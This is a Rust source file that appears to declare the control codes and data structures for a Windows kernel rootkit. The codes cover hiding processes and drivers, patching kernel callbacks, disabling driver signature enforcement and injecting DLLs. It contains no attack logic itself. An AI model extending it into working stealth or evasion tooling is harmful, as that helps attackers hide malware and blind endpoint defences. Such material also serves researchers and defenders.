#![no_std]

extern crate alloc;

use alloc::string::String;

use serde::{Deserialize, Serialize};

pub const IOCTL_KIT_NO_START: u32 = 0x803;
pub const IOCTL_KIT_PROCESS_HIDE: u32 = 0x804;
pub const IOCTL_KIT_PROCESS_CALLBACK_LIST: u32 = 0x805;
pub const IOCTL_KIT_PROCESS_CALLBACK_PATCH: u32 = 0x806;
pub const IOCTL_KIT_DSE: u32 = 0x807;
pub const IOCTL_KIT_DRIVER_HIDE: u32 = 0x808;
pub const IOCTL_KIT_DRIVER_LIST: u32 = 0x809;
pub const IOCTL_KIT_PROCESS_PROTECT: u32 = 0x80A;
pub const IOCTL_KIT_PROCESS_UNPROTECT: u32 = 0x80B;
pub const IOCTL_KIT_NET_INIT: u32 = 0x80C;
pub const IOCTL_KIT_NET_DESTROY: u32 = 0x80D;
pub const IOCTL_KIT_NET_NETT: u32 = 0x80E;
pub const IOCTL_KIT_NET_NETTT: u32 = 0x80F;
pub const IOCTL_EDR_PROTECT_PROCESS: u32 = 0x90F;

#[derive(Serialize, Deserialize, PartialEq, Eq, Default, Debug)]
#[repr(C)]
pub struct Callback {
    pub address: usize,
    pub module_name: String,
    pub module_base: usize,
}

#[derive(Serialize, Deserialize, PartialEq, Eq, Default, Debug)]
#[repr(C)]
pub struct DriverListEntry {
    pub base: usize,
    pub name: String,
}

#[derive(Serialize, Deserialize, PartialEq, Eq, Default, Debug)]
pub struct InjectCommand {
    pub pid: u32,
    pub dll_path: String,
}
